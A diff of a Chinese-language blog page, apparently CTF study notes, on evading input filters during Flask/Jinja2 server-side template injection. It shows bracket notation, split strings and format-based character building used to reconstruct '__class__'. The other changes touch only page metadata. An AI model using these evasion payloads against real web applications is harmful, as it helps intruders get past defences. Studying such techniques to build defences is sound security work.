+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__<span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure>
+
 <p>这一特性，把上下文变成了[]中的字符串，这个特性经常会被用来绕过点号的过滤。<br>由于里面的内容已经是字符串了，还可以做一个这样的变形</p>
 <figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.<span class="number">__</span><span class="keyword">class</span><span class="number">__</span>===<span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>]</span><br></pre></td></tr></table></figure>
 
 
+
 <p><strong>python的格式化字符串特性</strong></p>
 <p>因为python的字符串格式化允许指定ascii码为字符<br>如果放到flask里，就可以改写成<br><code>&quot;&#123;0:c&#125;&quot;[&#39;format&#39;](97)</code></p>
-<img src="http://img.npfs06.top/20210930003251.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20210930003251.png" style="zoom:80%;" />
 
 <p>那么<code>__class__</code>就可以变成</p>
 <figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;</span>[&#x27;&#123;0:c&#125;&#x27;[&#x27;format&#x27;](<span class="name">95</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">95</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">99</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">108</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">97</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">115</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">115</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">95</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">95</span>)]&#125;&#125;</span></span><br></pre></td></tr></table></figure>
 
 
+
 <p><strong>数字被过滤</strong></p>
 <p>当我们使用attr的时候，需要用的数字，那么如果数字被过滤了，我们可以使用这些特殊的数字来绕过</p>
-<img src="http://img.npfs06.top/20210930083133.png" style="zoom:80%;">
+<img src="http://img.npfs06.top/20210930083133.png" style="zoom:80%;" />
 
 
 
@@ -565,7 +580,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">108</span>
+          <span class="site-state-item-count">110</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -629,7 +644,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2026</span>
 
 
 <!--
